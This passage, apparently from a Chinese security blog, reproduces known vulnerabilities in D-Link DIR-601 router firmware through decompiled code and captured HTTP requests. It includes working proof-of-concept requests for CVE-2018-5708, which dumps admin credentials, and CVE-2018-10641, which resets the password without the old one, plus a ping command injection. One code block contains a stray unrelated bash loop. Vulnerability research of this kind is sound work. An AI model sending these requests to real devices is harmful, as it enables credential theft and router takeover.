class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment">#!/bin/ash</span><br><br><span class="hljs-comment"># This script runs when init it run during the boot process.</span><br><span class="hljs-comment"># Mounts everything in the fstab</span><br>mount -a                   <span class="hljs-string">//</span> 挂载<span class="hljs-string">/etc/fstab</span>中列出的所有文件系统<br>mount -o remount +w /      <span class="hljs-string">//</span> 将根文件系统重新挂载为可写模式<br><br><span class="hljs-comment"># Mount the RAM filesystem to /tmp</span><br>mount -t tmpfs tmpfs <span class="hljs-string">/tmp</span>  <span class="hljs-string">//</span> 将内存文件系统挂载到<span class="hljs-string">/tmp</span>目录<br><br><span class="hljs-comment"># copy all files in the mnt folder to the etc folder</span><br>cp -a <span class="hljs-string">/mnt/</span>* <span class="hljs-string">/etc</span>           <span class="hljs-string">//</span> 复制<span class="hljs-string">/mnt</span>文件夹下的所有文件到<span class="hljs-string">/etc</span>文件夹<br><br><span class="hljs-comment"># Create necessary directories</span><br>mkdir -p <span class="hljs-string">/var/etc</span><br>mkdir -p <span class="hljs-string">/var/firm</span><br>mkdir -p <span class="hljs-string">/var/log</span><br>mkdir -p <span class="hljs-string">/var/misc</span><br>mkdir -p <span class="hljs-string">/var/run</span><br>mkdir -p <span class="hljs-string">/var/sbin</span><br>mkdir -p <span class="hljs-string">/var/tmp</span><br>mkdir -p <span class="hljs-string">/tmp/var</span><br><br><span class="hljs-comment"># Start system_manager and tftpd as background processes</span><br>system_manager &amp;           <span class="hljs-string">//</span> 启动system_manager后台进程<br>tftpd &amp;                    <span class="hljs-string">//</span> 启动tftpd后台进程<br></code></pre></td></tr></table></figure><p>IDA二进制查看system_manager文件</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728215658086.png" alt="image-20240728215658086"></p><p>初始化系统</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">int</span> init_system()<br>&#123;<br>  load_entry();                   <span class="hljs-regexp">//</span> 载入程序入口（可能是某些配置或程序初始化）<br>  init_gpio();                    <span class="hljs-regexp">//</span> 初始化GPIO（通用输入输出）接口<br><br>  <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span>&quot;</span>);                <span class="hljs-regexp">//</span> 使用系统命令执行某个未知的操作，传入两个参数（字符串形式）<br>  <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;<span class="hljs-variable">%s</span> <span class="hljs-variable">%s</span>&quot;</span>);                <span class="hljs-regexp">//</span> 同上，执行另一个未知的操作，传入两个参数<br><br>  set_system_info();              <span class="hljs-regexp">//</span> 设置系统信息<br>  set_network_bridge();           <span class="hljs-regexp">//</span> 设置网络桥接<br><br>  set_host_name();                <span class="hljs-regexp">//</span> 设置主机名（设置设备或系统的主机名）<br><br>  <span class="hljs-keyword">sleep</span>(5u);                      <span class="hljs-regexp">//</span> 休眠<span class="hljs-number">5</span>秒，等待一些操作完成（<span class="hljs-string">`5u`</span>表示<span class="hljs-number">5</span>的无符号整数，单位为秒）<br><br>  byte_41393C = get_port_link_status(<span class="hljs-string">&quot;eth0&quot;</span>, <span class="hljs-number">4</span>);  <span class="hljs-regexp">//</span> 获取指定网络接口（eth0）的端口链接状态<br><br>  init_managers();                <span class="hljs-regexp">//</span> 初始化管理器<br><br>  init_web_server();              <span class="hljs-regexp">//</span> 初始化Web服务器（启动一个Web服务，提供Web接口）<br><br>  <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;switch_notifier &amp;&quot;</span>);    <span class="hljs-regexp">//</span> 启动一个名为 <span class="hljs-string">`switch_notifier`</span> 的后台进程<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;wan_led_control &amp;&quot;</span>);  <span class="hljs-regexp">//</span> 启动一个名为 <span class="hljs-string">`wan_led_control`</span> 的后台进程，并返回其执行结果<br>&#125;<br></code></pre></td></tr></table></figure><p>进入init_web_server函数</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">int</span> init_web_server()<br>&#123;<br>  init_html_files();    <span class="hljs-regexp">//</span> 初始化用于Web服务器所需的静态文件<br><br>  <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;sed -i &#x27;s/^#.*\&quot;mod_404redirect\&quot;/ \&quot;mod_404redirect\&quot;/g&#x27; /etc/lighttpd/modules.conf&quot;</span>);<br>  <span class="hljs-regexp">//</span> 使用系统命令调用 <span class="hljs-string">`sed`</span> 工具，用来修改 <span class="hljs-string">`/etc/lighttpd/modules.conf`</span> 文件，启用名为 <span class="hljs-string">`mod_404redirect`</span> 的模块<br><br>  update_lighttpd_user_conf();   <span class="hljs-regexp">//</span> 更新 lighttpd 的用户配置文件（假设这个函数更新了与用户相关的配置）<br><br>  <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;mkdir <span class="hljs-variable">%s</span>&quot;</span>);   <span class="hljs-regexp">//</span> 使用系统命令创建一个目录，但是代码中缺少目录名称参数，这可能导致问题<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;lighttpd -f <span class="hljs-variable">%s</span> &amp;&quot;</span>);<br>  <span class="hljs-regexp">//</span> 使用系统命令启动 lighttpd 服务器，<span class="hljs-string">`-f %s`</span> 是参数，用来指定 lighttpd 的配置文件路径<br>&#125;<br></code></pre></td></tr></table></figure><p>lighttpd就是这样起来的，在查看更新用户配置的函数update_lighttpd_user_conf()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE *<span class="hljs-title function_">update_lighttpd_user_conf</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">void</span> *v0;            <span class="hljs-comment">// 用于内存分配的指针</span><br>  <span class="hljs-type">int</span> i;               <span class="hljs-comment">// 循环计数器</span><br>  <span class="hljs-type">int</span> v2;              <span class="hljs-comment">// 用于存储计算的偏移量</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v3;      <span class="hljs-comment">// 辅助字符串指针</span><br>  <span class="hljs-type">char</span> *v4;            <span class="hljs-comment">// 辅助字符串指针</span><br>  <span class="hljs-type">int</span> v5;              <span class="hljs-comment">// 比较结果</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v6;      <span class="hljs-comment">// 中间件对象数据指针</span><br>  FILE *result;        <span class="hljs-comment">// 返回的文件指针</span><br>  FILE *v8;            <span class="hljs-comment">// 文件指针</span><br>  <span class="hljs-type">void</span> *ptr[<span class="hljs-number">5</span>];        <span class="hljs-comment">// 中间件对象数组</span><br>  <span class="hljs-type">int</span> v10[<span class="hljs-number">5</span>];          <span class="hljs-comment">// 辅助整数数组</span><br>  <span class="hljs-type">char</span> v11[<span class="hljs-number">36</span>];        <span class="hljs-comment">// 存储 admin_user_name 的缓冲区</span><br>  <span class="hljs-type">char</span> v12[<span class="hljs-number">36</span>];        <span class="hljs-comment">// 存储 admin_user_pwd 的缓冲区</span><br>  <span class="hljs-type">char</span> v13[<span class="hljs-number">80</span>];        <span class="hljs-comment">// 存储最终写入文件的格式化字符串</span><br><br>  <span class="hljs-comment">// 初始化缓冲区</span><br>  <span class="hljs-built_in">memset</span>(v11, <span class="hljs-number">0</span>, <span class="hljs-number">0x21</span>u);  <span class="hljs-comment">// 清空 v11</span><br>  <span class="hljs-built_in">memset</span>(v12, <span class="hljs-number">0</span>, <span class="hljs-number">0x21</span>u);  <span class="hljs-comment">// 清空 v12</span><br><br>  <span class="hljs-comment">// 创建中间件对象</span><br>  create_midware_obj(ptr);  <span class="hljs-comment">// 初始化中间件对象，存储在 ptr[0] 中</span><br>  v0 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x5CBA0</span>u);    <span class="hljs-comment">// 分配约374 KB的内存并赋给 v0</span><br>  ptr[<span class="hljs-number">0</span>] = v0;              <span class="hljs-comment">// 将分配的内存地址存储在 ptr[0] 中</span><br><br>  <span class="hljs-comment">// 处理中间件对象中的数据</span><br>  <span class="hljs-keyword">if</span> (v0)<br>  &#123;<br>    <span class="hljs-built_in">memset</span>(v10, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v10));  <span class="hljs-comment">// 清空辅助整数数组</span><br><br>    <span class="hljs-comment">// 查找 admin_user 的配置值</span><br>    <span class="hljs-keyword">if</span> (!((<span class="hljs-type">int</span> (__fastcall *)(<span class="hljs-type">int</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, _DWORD, <span class="hljs-type">void</span> *))ptr[<span class="hljs-number">1</span>])(v10, <span class="hljs-string">&quot;admin_user&quot;</span>, <span class="hljs-number">0</span>, v0))<br>    &#123;<br>      <span class="hljs-comment">// 循环处理中间件对象数据</span><br>      <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;; ++i)<br>      &#123;<br>        v6 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)ptr[<span class="hljs-number">0</span>];  <span class="hljs-comment">// 获取中间件对象数据指针</span><br>        <span class="hljs-keyword">if</span> (i &gt;= *((_DWORD *)ptr[<span class="hljs-number">0</span>] + <span class="hljs-number">1</span>))  <span class="hljs-comment">// 判断是否超出数据项数量</span><br>          <span class="hljs-keyword">break</span>;<br><br>        v2 = <span class="hljs-number">633</span> * i;  <span class="hljs-comment">// 计算偏移量</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)ptr[<span class="hljs-number">0</span>] + <span class="hljs-number">633</span> * i + <span class="hljs-number">8</span>, <span class="hljs-string">&quot;admin_user_name&quot;</span>))  <span class="hljs-comment">// 检查是否为 admin_user_name</span><br>        &#123;<br>          v5 = <span class="hljs-built_in">strcmp</span>(&amp;v6[<span class="hljs-number">633</span> * i + <span class="hljs-number">8</span>], <span class="hljs-string">&quot;admin_user_pwd&quot;</span>);  <span class="hljs-comment">// 检查是否为 admin_user_pwd</span><br>          v4 = v12;  <span class="hljs-comment">// 设置辅助指针为 v12</span><br>          <span class="hljs-keyword">if</span> (v5)  <span class="hljs-comment">// 如果不是 admin_user_pwd，则继续下一个循环</span><br>            <span class="hljs-keyword">continue</span>;<br>          v3 = &amp;v6[v2 + <span class="hljs-number">40</span>];  <span class="hljs-comment">// 设置 v3 指向 admin_user_pwd 的值</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          v3 = &amp;v6[v2 + <span class="hljs-number">40</span>];  <span class="hljs-comment">// 设置 v3 指向 admin_user_pwd 的值</span><br>          v4 = v11;  <span class="hljs-comment">// 设置辅助指针为 v11</span><br>        &#125;<br>        <span class="hljs-built_in">strcpy</span>(v4, v3);  <span class="hljs-comment">// 复制值</span><br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(ptr[<span class="hljs-number">0</span>]);  <span class="hljs-comment">// 释放内存</span><br>  &#125;<br><br>  <span class="hljs-comment">// 打开或创建文件 /etc/lighttpd/lighttpd.user</span><br>  result = fopen(<span class="hljs-string">&quot;/etc/lighttpd/lighttpd.user&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>  v8 = result;<br>  <span class="hljs-keyword">if</span> (result)<br>  &#123;<br>    <span class="hljs-comment">// 格式化要写入的字符串</span><br>    <span class="hljs-built_in">memset</span>(v13, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v13));  <span class="hljs-comment">// 清空 v13</span><br>    <span class="hljs-built_in">sprintf</span>(v13, <span class="hljs-string">&quot;%s:%s&quot;</span>, v11, v12);  <span class="hljs-comment">// 格式化 admin_user_name:admin_user_pwd</span><br>    <span class="hljs-built_in">fputs</span>(v13, v8);  <span class="hljs-comment">// 将格式化字符串写入文件</span><br>    <span class="hljs-keyword">return</span> (FILE *)fclose(v8);  <span class="hljs-comment">// 关闭文件并返回结果</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> result;  <span class="hljs-comment">// 返回文件指针（或者 NULL 如果打开文件失败）</span><br>&#125;<br></code></pre></td></tr></table></figure><p>admin_user_name:admin_user_pwd就这样被写进去了</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><h4 id="ping功能下的RCE"><a href="#ping功能下的RCE" class="headerlink" title="ping功能下的RCE"></a>ping功能下的RCE</h4><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729141058443.png" alt="image-20240729141058443"></p><p>这里看到ping test就试一下命令执行，先抓包分析一下</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729141140246.png" alt="image-20240729141140246"></p><p>抓包提交到了my_cgi.cgi</p><p>ida打开my_cgi.cgi分析一下，定位到ping_test函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729141248307.png" alt="image-20240729141248307"></p><p>可以看到sprintf函数把传进来的参数（ip地址）拼接成系统命令，并在下方的system函数执行</p><p>开始尝试拼接执行系统命令</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729142151923.png" alt="image-20240729142151923"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240729142226257.png" alt="image-20240729142226257"></p><p>成功写入</p><h4 id="CVE-2018-5708-信息泄露"><a href="#CVE-2018-5708-信息泄露" class="headerlink" title="CVE-2018-5708 信息泄露"></a><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-5708">CVE-2018-5708</a> 信息泄露</h4><p>POC</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728164709522.png" alt="image-20240728164709522"></p><p>在发往my_cgi.cgi的数据包中结合加入<code>request=load_settings&amp;table_name=admin_user</code>即可返回XML格式的用户名密码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">login_level</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">login_level</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">admin_user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">admin_user_name</span>&gt;</span><br>          admin<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">admin_user_name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">admin_user_pwd</span>&gt;</span><br>         123456<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">admin_user_pwd</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">admin_level</span>&gt;</span><br>          1<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">admin_level</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">admin_user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以看出是参数admin_user把整个table都读出来了</p><p>由于发往my_cgi.cgi的数据包是在登录页面login_real.htm中抓到的</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728170547941.png" alt="image-20240728170547941"></p><p>分析login_real.htm代码</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728170620082.png" alt="image-20240728170620082"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/my_cgi.cgi?0.42868205431214634</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">78</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">127.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">127.0.0.0</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>: */*</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.0.1</span>/login_real.htm</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Connection</span>: close</span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">request</span>=no_auth&amp;request=load_settings&amp;table_name=no_auth&amp;table_name=admin_user</span><br></code></pre></td></tr></table></figure><p>那么在后台参数又是如何传递的呢？</p><p>打开IDA</p><p>找到load_settings函数</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728190750323.png" alt="image-20240728190750323"></p><p>可以看到先检查了有没有no_auth参数</p><p>然后一步一步查看table_name是否匹配</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728190934765.png" alt="image-20240728190934765"></p><p>走到这里的时候，假设table_name&#x3D;admin_user 一直没有匹配的情况下，执行了这条。感觉IDA不是很准，打开Ghidra</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728191139422.png" alt="image-20240728191139422"></p><p>分析该代码</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">iVar1 = <span class="hljs-comment">(*(code *)</span>param_1[<span class="hljs-number">1</span>])<br>(&amp;reading_file,iVar4,<span class="hljs-number">0</span>,*param_1)<span class="hljs-punctuation">;</span><br><span class="hljs-comment">//这行代码的作用是调用一个通过 param_1[1] 指针指向的函数，并将其返回值赋给 iVar1。具体函数的功能和返回类型需要根据 param_1 的定义和对应函数的实现来确定。</span><br>#!/bin/bash<br><br><span class="hljs-keyword">while</span> <span class="hljs-keyword">true</span><br><span class="hljs-keyword">do</span><br>    clear <br>    ps aux<br>    sleep <span class="hljs-number">1</span><br>done<br></code></pre></td></tr></table></figure><p>这里应该是调用param_1[1] 指针指向的函数，执行readingfile操作，找的是那个文件呢？</p><p>在文件结构中搜索admin_user_pwd</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728203715351.png" alt="image-20240728203715351"></p><p>默认的用户名密码被存在nvram_default中</p><p>FirmAE进shell查找未果</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728204044172.png" alt="image-20240728204044172"></p><p>这里启动时应该是调用了nvram把密码写入到了内存，eeprom里面</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">NVRAM（Non-<span class="hljs-keyword">Volatile</span> Random-<span class="hljs-keyword">Access</span> Memory，非易失性随机存取存储器）是一种存储设备，能够在电源断电的情况下保持数据。与传统的 RAM（随机存取存储器）不同，RAM 是易失性的，即在断电时数据会丢失。NVRAM 通过不同的技术可以在断电后保持数据，例如：<br><br>闪存（Flash Memory）：一种常见的 NVRAM 类型，广泛用于存储数据，如固态硬盘（SSD）和 USB 闪存驱动器。<br><br>EEPROM（Electrically Erasable Programmable <span class="hljs-keyword">Read</span>-<span class="hljs-keyword">Only</span> Memory）：允许电气擦除和重新编程的只读存储器，常用于存储固件或配置数据。<br><br>FRAM（Ferroelectric RAM）：使用铁电材料来实现数据存储，具有快速写入和高耐久性的特点。<br><br>PROM（Programmable <span class="hljs-keyword">Read</span>-<span class="hljs-keyword">Only</span> Memory） 和 EPROM（Erasable Programmable <span class="hljs-keyword">Read</span>-<span class="hljs-keyword">Only</span> Memory）：早期的非易失性存储技术，现已被闪存和 EEPROM 替代。<br><br>NVRAM 的主要用途包括：<br><br>存储固件：嵌入式系统和计算机中的固件常常存储在 NVRAM 中，以确保在重新启动后仍能使用。<br>保存配置设置：例如路由器、交换机等网络设备中的配置数据通常存储在 NVRAM 中。<br>设备状态：一些设备可能将状态信息存储在 NVRAM 中，以便在重新启动后能够恢复到先前的状态。<br>NVRAM 的主要优点是它能够在断电情况下保留数据，适合需要持久保存配置信息或系统状态的应用。<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728214835092.png" alt="image-20240728214835092"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/7771105a3059461c2f1bda87870c.png" alt="5307771105a3059461c2f1bda87870c"></p><h4 id="CVE-2018-10641"><a href="#CVE-2018-10641" class="headerlink" title="CVE-2018-10641"></a><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-10641">CVE-2018-10641</a></h4><p>D-Link DIR-601 A1 1.02NA 设备不需要旧密码即可更改密码，密码以明文形式进行。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">拥有网络访问权限，尽管未经身份验证，攻击者可以确定用户名和密码。通过代理或 MITM 访问配置主机访问的 <span class="hljs-built_in">URL</span>，用户名和密码以 BASE64 编码传递以进行登录，并以明文形式传递以重置密码。注意：重置管理员密码不需要当前密码。<br></code></pre></td></tr></table></figure><p>这里使用的是版本是 2.02NA 但该漏洞仍然存在。</p><p>web页面修改密码并抓包</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728152148638.png" alt="image-20240728152148638"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ge-20240728152516906.png" alt="image-20240728152516906"></p><p>将admin_user_pwd修改，发包并修改成功。后进入web页面用密码admin3正常<strong>登录成功</strong></p><p>观察这个包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/my_cgi.cgi?0.17187552205421389</span> <span class="hljs-meta">HTTP/1.1</span><br><br><span class="language-apache"><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">285</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X11; Linux x86_64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">127.0.0.0</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">127.0.0.0</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>: */*</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">192.168.0.1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.0.1</span>/tools_admin.htm</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Accept</span>-Language: en-US,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">Connection</span>: close</span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">request</span>=update_entry&amp;table_name=admin_user&amp;rowid=<span class="hljs-number">0</span>&amp;admin_user_pwd=<span class="hljs-number">123456</span>&amp;request=update_entry&amp;table_name=system&amp;rowid=<span 